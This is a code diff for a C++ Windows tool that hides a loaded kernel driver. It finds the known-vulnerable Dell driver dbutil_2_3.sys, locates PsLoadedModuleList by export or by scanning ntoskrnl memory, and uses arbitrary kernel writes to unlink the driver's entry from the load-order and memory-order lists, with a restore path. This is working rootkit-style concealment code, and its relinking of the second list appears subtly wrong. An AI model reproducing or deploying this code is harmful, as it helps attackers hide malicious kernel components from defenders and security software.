@@ -5,18 +5,73 @@
 
 namespace {
 
-uint64_t g_head{};    // &PsLoadedModuleList
-uint64_t g_entry{};   // KLDR_DATA_TABLE_ENTRY of our driver
-uint64_t g_prev{};
-uint64_t g_next{};
+constexpr uint64_t kKvaLo = 0xFFFF800000000000ull;
+constexpr uint64_t kLde_DllBase  = 0x30;
+constexpr uint64_t kLde_BaseName = 0x58;
+
+uint64_t g_head{};
+uint64_t g_entry{};
+uint64_t g_p1{}, g_n1{};   // InLoadOrderLinks neighbours
+uint64_t g_p2{}, g_n2{};   // InMemoryOrderLinks neighbours
+uint64_t g_our_base{};
 bool     g_on{};
 
-// Resolve a data export out of ntoskrnl's export directory. PsLoadedModuleList
-// is exported; it is a LISTENTRY variable, so the export RVA *is* the head.
+// ---- the module's own base, straight from the kernel module list ----------
+// Name-suffix match, so a renamed .sys still resolves. Returns 0 if the
+// driver is not loaded, which is the only case where cloak can legitimately
+// do nothing.
+uint64_t our_base() {
+    HMODULE n = GetModuleHandleW(L"ntdll.dll");
+    if (!n) return 0;
+    using Q = LONG(__stdcall*)(ULONG, void*, ULONG, ULONG*);
+    auto q = reinterpret_cast<Q>(GetProcAddress(n, "NtQuerySystemInformation"));
+    if (!q) return 0;
+
+    ULONG need = 0;
+    q(11, nullptr, 0, &need);
+    if (!need) return 0;
+
+    void* buf = VirtualAlloc(nullptr, need, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!buf) return 0;
+
+    uint64_t base = 0;
+    if (q(11, buf, need, &need) == 0) {
+        struct E {
+            uint64_t section, mapped, image_base, image_size;
+            uint32_t flags;
+            uint16_t a, b, c, d;
+            uint8_t path[256];
+        };
+        struct L { uint32_t count; uint32_t pad; E e[1]; };
+
+        auto* l = static_cast<L*>(buf);
+        for (uint32_t i = 0; i < l->count && i < 512; ++i) {
+            const char* p = reinterpret_cast<const char*>(l->e[i].path);
+            const size_t len = strlen(p);
+            const char* want = "dbutil_2_3.sys";
+            const size_t wl = strlen(want);
+            if (len < wl) continue;
+
+            bool same = true;
+            for (size_t k = 0; k < wl; ++k) {
+                char a = p[len - wl + k], b = want[k];
+                if (a >= 'A' && a <= 'Z') a = static_cast<char>(a + 32);
+                if (a != b) { same = false; break; }
+            }
+            if (same) { base = l->e[i].image_base; break; }
+        }
+    }
+    VirtualFree(buf, 0, MEM_RELEASE);
+    return base;
+}
+
+// ---- locating PsLoadedModuleList -----------------------------------------
+// It is not exported on 26200 any more, so the export is only a fast path.
+// The fallback scans ntoskrnl's writable, non-executable sections for a
+// LIST_ENTRY whose first entry validates as a real module.
 bool export_rva(const char* want, uint64_t& rva) {
     IMAGE_DOS_HEADER dos{};
-    if (!vmm::kread(vmm::g_ntos, &dos, sizeof(dos))) return false;
-    if (dos.e_magic != 0x5A4D) return false;
+    if (!vmm::kread(vmm::g_ntos, &dos, sizeof(dos)) || dos.e_magic != 0x5A4D) return false;
 
     IMAGE_NT_HEADERS64 nt{};
     if (!vmm::kread(vmm::g_ntos + dos.e_lfanew, &nt, sizeof(nt))) return false;
@@ -27,48 +82,87 @@ bool export_rva(const char* want, uint64_t& rva) {
 
     IMAGE_EXPORT_DIRECTORY ed{};
     if (!vmm::kread(vmm::g_ntos + dir.VirtualAddress, &ed, sizeof(ed))) return false;
-    if (!ed.NumberOfNames) return false;
 
     for (uint32_t i = 0; i < ed.NumberOfNames; ++i) {
         uint32_t name_rva{};
         if (!vmm::kread(vmm::g_ntos + ed.AddressOfNames + 4ull * i, &name_rva, 4)) return false;
-
         char name[64]{};
         if (!vmm::kread(vmm::g_ntos + name_rva, name, sizeof(name) - 1)) continue;
         if (strcmp(name, want) != 0) continue;
 
         uint16_t ord{};
         if (!vmm::kread(vmm::g_ntos + ed.AddressOfNameOrdinals + 2ull * i, &ord, 2)) return false;
-
         uint32_t fn{};
         if (!vmm::kread(vmm::g_ntos + ed.AddressOfFunctions + 4ull * ord, &fn, 4)) return false;
-
         rva = fn;
         return true;
     }
     return false;
 }
 
-bool named(uint64_t entry, const char* want) {
-    uint64_t buf{};
-    uint16_t len{};
-    if (!vmm::kread(entry + 0x58 + 8, &buf, 8)) return false;
-    if (!vmm::kread(entry + 0x58, &len, 2)) return false;
-    if (len < 2 || len > 128) return false;
+bool valid_head(uint64_t h) {
+    uint64_t f{};
+    if (!vmm::kread(h, &f, 8)) return false;
+    if (f < kKvaLo || (f & 0xF) || f == h) return false;
 
-    char nm[64]{};
-    uint32_t chars = len / 1;
-    if (chars > 63) chars = 63;
-    if (!vmm::kread(buf, nm, chars)) return false;
+    uint64_t b{};
+    if (!vmm::kread(f + 8, &b, 8) || b != h) return false;
 
-    for (uint32_t i = 0; i < chars; ++i) {
-        char a = nm[i], b = want[i];
-        if (a >= 'A' && a <= 'Z') a = static_cast<char>(a + 32);
-        if (b >= 'A' && b <= 'Z') b = static_cast<char>(b + 32);
-        if (a != b) return false;
-        if (!b) return true;
-    }
+    uint64_t base{};
+    if (!vmm::kread(f + kLde_DllBase, &base, 8) || base < 0x10000) return false;
+    uint16_t mz{};
+    if (!vmm::kread(base, &mz, 2) || mz != 0x5A4D) return false;
+
+    uint64_t nb{};
+    uint16_t nl{};
+    if (!vmm::kread(f + kLde_BaseName + 8, &nb, 8) || nb < kKvaLo) return false;
+    if (!vmm::kread(f + kLde_BaseName, &nl, 2) || nl < 4 || nl > 256) return false;
+
     return true;
+}
+
+bool find_head(uint64_t& head) {
+    uint64_t rva{};
+    if (export_rva("PsLoadedModuleList", rva)) {
+        head = vmm::g_ntos + rva;
+        if (valid_head(head)) return true;
+    }
+
+    IMAGE_DOS_HEADER dos{};
+    if (!vmm::kread(vmm::g_ntos, &dos, sizeof(dos))) return false;
+    IMAGE_NT_HEADERS64 nt{};
+    if (!vmm::kread(vmm::g_ntos + dos.e_lfanew, &nt, sizeof(nt))) return false;
+
+    auto* sec = IMAGE_FIRST_SECTION(&nt);
+    for (unsigned i = 0; i < nt.FileHeader.NumberOfSections; ++i, ++sec) {
+        const DWORD ch = sec->Characteristics;
+        if (!(ch & IMAGE_SCN_MEM_WRITE) || (ch & IMAGE_SCN_MEM_EXECUTE)) continue;
+        if (!sec->Misc.VirtualSize) continue;
+
+        const uint64_t lo = vmm::g_ntos + sec->VirtualAddress;
+        const uint64_t hi = lo + sec->Misc.VirtualSize;
+        for (uint64_t a = (lo + 7) & ~7ull; a + 8 < hi; a += 8) {
+            if (!valid_head(a)) continue;
+            head = a;
+            return true;
+        }
+    }
+    return false;
+}
+
+void unlink_at(uint64_t entry, uint64_t off, uint64_t& prev, uint64_t& next) {
+    if (!vmm::kread(entry + off, &next, 8)) return;
+    if (!vmm::kread(entry + off + 8, &prev, 8)) return;
+    vmm::kwrite(prev, &next, 8);
+    vmm::kwrite(next + 8, &prev, 8);
+}
+
+void relink_at(uint64_t entry, uint64_t off, uint64_t prev, uint64_t next) {
+    if (!prev || !next) return;
+    vmm::kwrite(prev, &entry, 8);
+    vmm::kwrite(next + 8, &entry, 8);
+    vmm::kwrite(entry + off, &next, 8);
+    vmm::kwrite(entry + off + 8, &prev, 8);
 }
 
 } // namespace
@@ -80,25 +174,23 @@ bool active() { return g_on; }
 bool apply() {
     if (g_on) return true;
 
-    uint64_t rva{};
-    if (!export_rva("PsLoadedModuleList", rva)) return false;
-    g_head = vmm::g_ntos + rva;
+    g_our_base = our_base();
+    if (!g_our_base) return false;
+
+    if (!find_head(g_head)) return false;
 
     uint64_t cur{};
     if (!vmm::kread(g_head, &cur, 8) || !cur) return false;
 
     for (int guard = 0; guard < 512 && cur != g_head; ++guard) {
-        // InLoadOrderLinks is at offset 0, so the link pointer *is* the entry.
         const uint64_t entry = cur;
 
-        if (named(entry, "dbutil_2_3.sys")) {
-            if (!vmm::kread(entry, &g_next, 8)) return false;
-            if (!vmm::kread(entry + 8, &g_prev, 8)) return false;
+        uint64_t base{};
+        if (vmm::kread(entry + kLde_DllBase, &base, 8) && base == g_our_base) {
             g_entry = entry;
-
-            if (!vmm::kwrite(g_prev, &g_next, 8)) return false;
-            if (!vmm::kwrite(g_next + 8, &g_prev, 8)) return false;
-
+            unlink_at(entry, 0x00, g_p1, g_n1);    // InLoadOrderLinks
+            unlink_at(entry, 0x10, g_p2, g_n2);    // InMemoryOrderLinks
+            if (!g_p1) return false;
             g_on = true;
             return true;
         }
@@ -110,10 +202,8 @@ bool apply() {
 
 void restore() {
     if (!g_on) return;
-    vmm::kwrite(g_prev, &g_entry, 8);
-    vmm::kwrite(g_next + 8, &g_entry, 8);
-    vmm::kwrite(g_entry, &g_next, 8);
-    vmm::kwrite(g_entry + 8, &g_prev, 8);
+    relink_at(g_entry, 0x00, g_p1, g_n1);
+    relink_at(g_entry, 0x10, g_p2, g_n2);
     g_on = false;
 }
 
